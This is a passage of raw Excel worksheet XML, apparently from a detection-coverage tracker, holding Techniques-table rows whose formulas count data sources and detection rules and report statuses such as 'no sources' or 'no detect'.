        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O254" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P254" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S25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54" t="s">
        <v>368</v>
      </c>
      <c r="U254" t="s">
        <v>1370</v>
      </c>
      <c r="V254" t="s">
        <v>1371</v>
      </c>
      <c r="W254" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="255" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A255" t="s">
        <v>1372</v>
      </c>
      <c r="B255" t="s">
        <v>1372</v>
      </c>
      <c r="C255" t="s">
        <v>136</v>
      </c>
      <c r="D255" t="s">
        <v>6</v>
      </c>
      <c r="E255" t="s">
        <v>959</v>
      </c>
      <c r="F255" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G255" s="9" cm="1">
        <f t="array" ref="G255">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H255" s="9" cm="1">
        <f t="array" ref="H255">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I255" s="9" t="str" cm="1">
        <f t="array" ref="I255">IF(SUM(IF($C255=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C255=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J255" s="9" t="str" cm="1">
        <f t="array" ref="J25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55" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M255" s="9" cm="1">
        <f t="array" ref="M255">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N255" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O255" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P255" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S25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55" t="s">
        <v>1373</v>
      </c>
      <c r="U255" t="s">
        <v>1374</v>
      </c>
      <c r="V255" t="s">
        <v>1375</v>
      </c>
      <c r="W255" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="256" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A256" t="s">
        <v>1376</v>
      </c>
      <c r="B256" t="s">
        <v>1376</v>
      </c>
      <c r="C256" t="s">
        <v>56</v>
      </c>
      <c r="D256" t="s">
        <v>7</v>
      </c>
      <c r="E256" t="s">
        <v>1377</v>
      </c>
      <c r="F256" s="9">
        <f t="shared" si="3"/>
        <v>3</v>
      </c>
      <c r="G256" s="9" cm="1">
        <f t="array" ref="G256">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H256" s="9" cm="1">
        <f t="array" ref="H256">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I256" s="9" t="str" cm="1">
        <f t="array" ref="I256">IF(SUM(IF($C256=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C256=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J256" s="9" t="str" cm="1">
        <f t="array" ref="J25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56" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M256" s="9" cm="1">
        <f t="array" ref="M256">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N256" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O256" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P256" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S25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56" t="s">
        <v>1287</v>
      </c>
      <c r="U256" t="s">
        <v>1378</v>
      </c>
      <c r="V256" t="s">
        <v>1379</v>
      </c>
      <c r="W256" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="257" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A257" t="s">
        <v>1380</v>
      </c>
      <c r="B257" t="s">
        <v>1380</v>
      </c>
      <c r="C257" t="s">
        <v>132</v>
      </c>
      <c r="D257" t="s">
        <v>10</v>
      </c>
      <c r="E257" t="s">
        <v>1381</v>
      </c>
      <c r="F257" s="9">
        <f t="shared" si="3"/>
        <v>2</v>
      </c>
      <c r="G257" s="9" cm="1">
        <f t="array" ref="G257">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H257" s="9" cm="1">
        <f t="array" ref="H257">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I257" s="9" t="str" cm="1">
        <f t="array" ref="I257">IF(SUM(IF($C257=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C257=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J257" s="9" cm="1">
        <f t="array" ref="J25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257" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M257" s="9" cm="1">
        <f t="array" ref="M257">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N257" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O257" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P257" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S25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57" t="s">
        <v>1165</v>
      </c>
      <c r="U257" t="s">
        <v>1382</v>
      </c>
      <c r="V257" t="s">
        <v>1383</v>
      </c>
      <c r="W257" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="258" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A258" t="s">
        <v>1380</v>
      </c>
      <c r="B258" t="s">
        <v>1384</v>
      </c>
      <c r="C258" t="s">
        <v>1385</v>
      </c>
      <c r="D258" t="s">
        <v>10</v>
      </c>
      <c r="E258" t="s">
        <v>1381</v>
      </c>
      <c r="F258" s="9">
        <f t="shared" ref="F258:F321" si="4">LEN(E258)-LEN(SUBSTITUTE(E258,",",""))+1</f>
        <v>2</v>
      </c>
      <c r="G258" s="9" cm="1">
        <f t="array" ref="G258">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H258" s="9" t="str" cm="1">
        <f t="array" ref="H258">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I258" s="9" t="str" cm="1">
        <f t="array" ref="I258">IF(SUM(IF($C258=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C258=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J258" s="9" t="str" cm="1">
        <f t="array" ref="J25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58" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M258" s="9" cm="1">
        <f t="array" ref="M258">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N258" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O258" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P258" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S25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58" t="s">
        <v>1386</v>
      </c>
      <c r="U258" t="s">
        <v>1387</v>
      </c>
      <c r="V258" t="s">
        <v>1388</v>
      </c>
      <c r="W258" t="b">
        <v>1</v>
      </c>
      <c r="X258" t="s">
        <v>1380</v>
      </c>
    </row>
    <row r="259" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A259" t="s">
        <v>1380</v>
      </c>
      <c r="B259" t="s">
        <v>1389</v>
      </c>
      <c r="C259" t="s">
        <v>297</v>
      </c>
      <c r="D259" t="s">
        <v>10</v>
      </c>
      <c r="E259" t="s">
        <v>1390</v>
      </c>
      <c r="F259" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G259" s="9" cm="1">
        <f t="array" ref="G259">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H259" s="9" t="str" cm="1">
        <f t="array" ref="H259">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I259" s="9" t="str" cm="1">
        <f t="array" ref="I259">IF(SUM(IF($C259=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C259=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J259" s="9" t="str" cm="1">
        <f t="array" ref="J25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59" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M259" s="9" cm="1">
        <f t="array" ref="M259">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N259" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O259" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P259" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S25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59" t="s">
        <v>1023</v>
      </c>
      <c r="U259" t="s">
        <v>1391</v>
      </c>
      <c r="V259" t="s">
        <v>1392</v>
      </c>
      <c r="W259" t="b">
        <v>1</v>
      </c>
      <c r="X259" t="s">
        <v>1380</v>
      </c>
    </row>
    <row r="260" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A260" t="s">
        <v>1380</v>
      </c>
      <c r="B260" t="s">
        <v>1393</v>
      </c>
      <c r="C260" t="s">
        <v>1394</v>
      </c>
      <c r="D260" t="s">
        <v>10</v>
      </c>
      <c r="E260" t="s">
        <v>1381</v>
      </c>
      <c r="F260" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G260" s="9" cm="1">
        <f t="array" ref="G260">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H260" s="9" t="str" cm="1">
        <f t="array" ref="H260">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I260" s="9" t="str" cm="1">
        <f t="array" ref="I260">IF(SUM(IF($C260=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C260=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J260" s="9" t="str" cm="1">
        <f t="array" ref="J26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60" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M260" s="9" cm="1">
        <f t="array" ref="M260">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N260" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O260" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P260" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S26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60" t="s">
        <v>1386</v>
      </c>
      <c r="U260" t="s">
        <v>1395</v>
      </c>
      <c r="V260" t="s">
        <v>1396</v>
      </c>
      <c r="W260" t="b">
        <v>1</v>
      </c>
      <c r="X260" t="s">
        <v>1380</v>
      </c>
    </row>
    <row r="261" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A261" t="s">
        <v>1380</v>
      </c>
      <c r="B261" t="s">
        <v>1397</v>
      </c>
      <c r="C261" t="s">
        <v>1398</v>
      </c>
      <c r="D261" t="s">
        <v>10</v>
      </c>
      <c r="E261" t="s">
        <v>1381</v>
      </c>
      <c r="F261" s="9">
        <f t="shared" si="4"/>
        <v>2</v>
      </c>
      <c r="G261" s="9" cm="1">
        <f t="array" ref="G261">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H261" s="9" t="str" cm="1">
        <f t="array" ref="H261">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I261" s="9" t="str" cm="1">
        <f t="array" ref="I261">IF(SUM(IF($C261=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C261=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J261" s="9" t="str" cm="1">
        <f t="array" ref="J26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61" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M261" s="9" cm="1">
        <f t="array" ref="M261">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N261" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O261" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P261" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S26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61" t="s">
        <v>1386</v>
      </c>
      <c r="U261" t="s">
        <v>1399</v>
      </c>
      <c r="W261" t="b">
        <v>1</v>
      </c>
      <c r="X261" t="s">
        <v>1380</v>
      </c>
    </row>
    <row r="262" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A262" t="s">
        <v>1380</v>
      </c>
      <c r="B262" t="s">
        <v>1400</v>
      </c>
      <c r="C262" t="s">
        <v>1401</v>
      </c>
      <c r="D262" t="s">
        <v>10</v>
      </c>
      <c r="E262" t="s">
        <v>549</v>
      </c>
      <c r="F262" s="9">
        <f t="shared" si="4"/>
        <v>1</v>
      </c>
      <c r="G262" s="9" cm="1">
        <f t="array" ref="G262">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H262" s="9" t="str" cm="1">
        <f t="array" ref="H262">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I262" s="9" t="str" cm="1">
        <f t="array" ref="I262">IF(SUM(IF($C262=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C262=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J262" s="9" t="str" cm="1">
        <f t="array" ref="J26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62" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M262" s="9" cm="1">
        <f t="array" ref="M262">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N262" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O262" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P262" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S26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62" t="s">
        <v>1402</v>
      </c>
      <c r="U262" t="s">
        <v>1403</v>
      </c>
      <c r="W262" t="b">
        <v>1</v>
      </c>
      <c r="X262" t="s">
        <v>1380</v>
      </c>
    </row>
    <row r="263" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A263" t="s">
        <v>1404</v>
      </c>
      <c r="B263" t="s">
        <v>1404</v>
      </c>
      <c r="C263" t="s">
        <v>211</v>
      </c>
      <c r="D263" t="s">
        <v>6</v>
      </c>
      <c r="E263" t="s">
        <v>815</v>
      </c>
      <c r="F263" s="9">
        <f t="shared" si="4"/>
        <v>3</v>
      </c>
      <c r="G263" s="9" cm="1">
        <f t="array" ref="G263">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H263" s="9" cm="1">
        <f t="array" ref="H263">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I263" s="9" t="str" cm="1">
        <f t="array" ref="I263">IF(SUM(IF($C263=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C263=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J263" s="9" cm="1">
        <f t="array" ref="J26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263" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M263" s="9" cm="1">
        <f t="array" ref="M263">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N263" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O263" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P263" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S26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63" t="s">
        <v>386</v>
      </c>
      <c r="U263" t="s">
        <v>1405</v>
      </c>
      <c r="V263" t="s">
        <v>1406</v>
      </c>
      <c r="W263" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="264" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A264" t="s">
        <v>1404</v>
      </c>
      <c r="B264" t="s">
        <v>1407</v>
      </c>
      <c r="C264" t="s">
        <v>1408</v>
      </c>
